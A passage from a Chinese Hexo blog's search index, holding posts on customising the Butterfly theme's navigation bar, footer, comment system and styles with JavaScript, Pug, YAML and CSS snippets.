i.fas.fa-bars.fa-fw</span><br></pre></td></tr></table></figure><p>自定义 <code>nav.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;pjax:complete&#x27;</span>, tonav);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, tonav);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">tonav</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;name-container&quot;</span>).<span class="title function_">setAttribute</span>(<span class="string">&quot;style&quot;</span>, <span class="string">&quot;display:none&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> position = $(<span class="variable language_">window</span>).<span class="title function_">scrollTop</span>();</span><br><span class="line"></span><br><span class="line">    $(<span class="variable language_">window</span>).<span class="title function_">scroll</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> scroll = $(<span class="variable language_">window</span>).<span class="title function_">scrollTop</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (scroll &gt; position) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;name-container&quot;</span>).<span class="title function_">setAttribute</span>(<span class="string">&quot;style&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;menus_items&quot;</span>)[<span class="number">1</span>].<span class="title function_">setAttribute</span>(<span class="string">&quot;style&quot;</span>, <span class="string">&quot;display:none!important&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;menus_items&quot;</span>)[<span class="number">1</span>].<span class="title function_">setAttribute</span>(<span class="string">&quot;style&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;name-container&quot;</span>).<span class="title function_">setAttribute</span>(<span class="string">&quot;style&quot;</span>, <span class="string">&quot;display:none&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        position = scroll;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;page-name&quot;</span>).<span class="property">innerText</span> = <span class="variable language_">document</span>.<span class="property">title</span>.<span class="title function_">split</span>(<span class="string">&quot; |柠檬mlemontx&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">scrollToTop</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;menus_items&quot;</span>)[<span class="number">1</span>].<span class="title function_">setAttribute</span>(<span class="string">&quot;style&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;name-container&quot;</span>).<span class="title function_">setAttribute</span>(<span class="string">&quot;style&quot;</span>, <span class="string">&quot;display:none&quot;</span>);</span><br><span class="line">    btf.<span class="title function_">scrollToDest</span>(<span class="number">0</span>, <span class="number">500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>_config.butterfly.yml</code> 的 <code>bottom</code> 中 引入 <code>jQuery</code> 和 <code>nav.js</code>，然后开启 <code>pjax</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/constant.css&quot;&gt;</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/loading.css&quot;&gt;</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/nav.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">src=&quot;https://fastly.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src=&quot;/js/nav.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">pjax:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br></pre></td></tr></table></figure><p>在自定义 <code>nav.css</code> 中添加如下的 css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#page-name</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">    <span class="attribute">color</span>: white <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;回到顶部&#x27;</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">var</span>(--mlemontx-theme);</span><br><span class="line">    <span class="attribute">transition</span>: all .<span class="number">3s</span>;</span><br><span class="line">    -webkit-<span class="attribute">transition</span>: all .<span class="number">3s</span>;</span><br><span class="line">    -moz-<span class="attribute">transition</span>: all .<span class="number">3s</span>;</span><br><span class="line">    -ms-<span class="attribute">transition</span>: all .<span class="number">3s</span>;</span><br><span class="line">    -o-<span class="attribute">transition</span>: all .<span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">3px</span> <span class="built_in">var</span>(--mlemontx-theme);</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">45px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-name</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">900px</span>) &#123;</span><br><span class="line">    <span class="selector-id">#page-name</span>, <span class="selector-id">#menus</span> &#123;</span><br><span class="line">        <span class="attribute">display</span>: none <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#name-container</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: all .<span class="number">3s</span>;</span><br><span class="line">    -webkit-<span class="attribute">transition</span>: all .<span class="number">3s</span>;</span><br><span class="line">    -moz-<span class="attribute">transition</span>: all .<span class="number">3s</span>;</span><br><span class="line">    -ms-<span class="attribute">transition</span>: all .<span class="number">3s</span>;</span><br><span class="line">    -o-<span class="attribute">transition</span>: all .<span class="number">3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#name-container</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    scale: <span class="number">1.03</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#page-name</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#nav</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>评论系统</title>
      <link href="/2023/03/01/%E5%8D%9A%E5%AE%A2/%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/03/01/%E5%8D%9A%E5%AE%A2/%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/>## 参考来源<p><a href="https://butterfly.js.org/posts/ceeb73f/">Butterfly | Butterfly 安装文档(四) 主题配置-2</a></p><p><a href="https://waline.js.org/">waline</a></p><p>这里我们直接跟着教程做就可以了！！！</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>页脚</title>
      <link href="/2023/03/01/%E5%8D%9A%E5%AE%A2/%E9%A1%B5%E8%84%9A/"/>
      <url>/2023/03/01/%E5%8D%9A%E5%AE%A2/%E9%A1%B5%E8%84%9A/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><p><a href="https://www.chuckle.top/">chuckle轻笑</a></p><h2 id="修改-fotter-pug"><a href="#修改-fotter-pug" class="headerlink" title="修改 fotter.pug"></a>修改 <code>fotter.pug</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#footer-wrap</span><br><span class="line">  div(id=&#x27;footer-icon&#x27;)</span><br><span class="line">    dev(id=&#x27;footer-avatar-left&#x27;)</span><br><span class="line">      a(class=&#x27;avatar-link&#x27; href=&#x27;/link/&#x27; title=&#x27;友链&#x27;)</span><br><span class="line">        i(class=&#x27;fa-solid fa-link fa-fw&#x27;)</span><br><span class="line">      a(class=&#x27;avatar-link&#x27; href=&#x27;/message/&#x27; title=&#x27;留言&#x27;)</span><br><span class="line">        i(class=&#x27;fa-regular fa-comment fa-fw&#x27;)</span><br><span class="line">    img(id=&#x27;footer-avatar&#x27; src=&#x27;//s2.loli.net/2023/03/04/aBsd12DAvGUtob9.png&#x27; onclick=&#x27;btf.scrollToDest(0,500)&#x27; title=&#x27;返回顶部&#x27;)</span><br><span class="line">    dev(id=&#x27;footer-avatar-right&#x27;)</span><br><span class="line">      a(class=&#x27;avatar-link&#x27; target=&#x27;-blank&#x27; href=&#x27;https://res.abeim.cn/api/qq/?qq=10845535&#x27; rel=&#x27;noopener external nofollow&#x27; title=&#x27;联系QQ&#x27;)</span><br><span class="line">        i(class=&#x27;fa-brands fa-qq fa-fw&#x27;)</span><br><span class="line">      a(class=&#x27;avatar-link&#x27; href=&#x27;mailto:10845535@qq.com&#x27; rel=&#x27;noopener external nofollow&#x27; title=&#x27;邮件联系&#x27;)</span><br><span class="line">        i(class=&#x27;fa-solid fa-envelope fa-fw&#x27;)</span><br><span class="line">  if theme.footer.owner.enable</span><br><span class="line">    - var now = new Date()</span><br><span class="line">    - var nowYear = now.getFullYear()</span><br><span class="line">    if theme.footer.owner.since &amp;&amp; theme.footer.owner.since != nowYear</span><br><span class="line">      .copyright!= `&amp;copy;$&#123;theme.footer.owner.since&#125; - $&#123;nowYear&#125; By $&#123;config.author&#125;`</span><br><span class="line">    else</span><br><span class="line">      .copyright!= `&amp;copy;$&#123;nowYear&#125; By $&#123;config.author&#125;`</span><br><span class="line">  if theme.footer.custom_text</span><br><span class="line">    .footer_custom_text!=`$&#123;theme.footer.custom_text&#125;`</span><br><span class="line">  #footer-word-count=`▹柠檬mlemontx居然写了「$&#123;totalcount(site)&#125;」字，好像写完一本『埃克苏佩里』的《小王子》了啊◃`</span><br><span class="line">  #footer-time-info</span><br><span class="line">    span#day-time= &#x27;载入天数...&#x27;</span><br><span class="line">    span#times= &#x27;载入时分秒...&#x27;</span><br><span class="line">  div(id=&#x27;footer-badge&#x27; style=&#x27;margin:14px 0px 14px 0px&#x27;)</span><br><span class="line">    a(target=&#x27;_blank&#x27; href=&#x27;https://hexo.io/&#x27; style=&#x27;margin-inline:5px&#x27;)</span><br><span class="line">      img(src=&#x27;/img/footer-badge/hexo.svg&#x27;)</span><br><span class="line">    a(target=&#x27;_blank&#x27; href=&#x27;https://butterfly.js.org/&#x27; style=&#x27;margin-inline:5px&#x27;)</span><br><span class="line">      img(src=&#x27;/img/footer-badge/butterfly.svg&#x27;)</span><br><span class="line">    a(target=&#x27;_blank&#x27; href=&#x27;https://github.com/&#x27; style=&#x27;margin-inline:5px&#x27;)</span><br><span class="line">      img(src=&#x27;/img/footer-badge/github.svg&#x27;)</span><br><span class="line">    a(target=&#x27;_blank&#x27; href=&#x27;https://icp.gov.moe/&#x27; style=&#x27;margin-inline:5px&#x27;)</span><br><span class="line">      img(src=&#x27;/img/footer-badge/gov.svg&#x27;)</span><br><span class="line">    a(target=&#x27;_blank&#x27; href=&#x27;https://vercel.com/&#x27; style=&#x27;margin-inline:5px&#x27;)</span><br><span class="line">      img(src=&#x27;/img/footer-badge/vercel.svg&#x27;)</span><br><span class="line">script.</span><br><span class="line">  if (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) &#123;</span><br><span class="line">    function timeInfo() &#123;</span><br><span class="line">      const startTimeStamp = new Date(&#x27;2023-06-25 00:00:00&#x27;).getTime();</span><br><span class="line">      const endTimeStamp = new Date().getTime();</span><br><span class="line">      const timeStamp = (endTimeStamp - startTimeStamp) / 1000;</span><br><span class="line">      const days = Math.floor(timeStamp / 60 / 60 / 24);</span><br><span class="line">      const hours = Math.floor(timeStamp / 60 / 60 % 24);</span><br><span class="line">      const minutes = Math.floor(timeStamp /60 % 60);</span><br><span class="line">      const seconds = Math.floor(timeStamp % 60);</span><br><span class="line">      document.getElementById(&#x27;day-time&#x27;).innerHTML = `自 2023-06-25 建站以来，小站已苟活 $&#123;days&#125; 天 `;</span><br><span class="line">      document.getElementById(&#x27;times&#x27;).innerHTML = `$&#123;hours&#125; 时 $&#123;minutes&#125; 分 $&#123;seconds&#125; 秒 ( =•ω•= )m`;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setInterval(timeInfo, 1000);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="添加自定义文件-fotter-css"><a href="#添加自定义文件-fotter-css" class="headerlink" title="添加自定义文件 fotter.css"></a>添加自定义文件 <code>fotter.css</code></h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#footer-icon</span> &#123;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">12px</span> <span class="number">12px</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">    <span class="attribute">padding-bottom</span>: <span class="number">1rem</span>;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">margin</span>: auto;</span><br><span class="line">    <span class="attribute">max-width</span>: <span class="number">1200px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">97%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#footer-avatar</span> &#123;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">60px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">1rem</span>;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">    <span class="attribute">transition</span>: all .<span class="number">25s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.avatar-link</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">1rem</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#363636e2</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">3rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#footer-avatar-left</span>, <span class="selector-id">#footer-avatar-right</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>butterfly 主题主要就是修改 pug 文件和 css 样式，如果有参考博客的话，改东西很简单；</p><p>你只需要 f12，查看源代码，查看 css 样式，查看 js 基本都可以原样复制。</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>首页</title>
      <link href="/2023/03/01/%E5%8D%9A%E5%AE%A2/%E9%A6%96%E9%A1%B5/"/>
      <url>/2023/03/01/%E5%8D%9A%E5%AE%A2/%E9%A6%96%E9%A1%B5/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
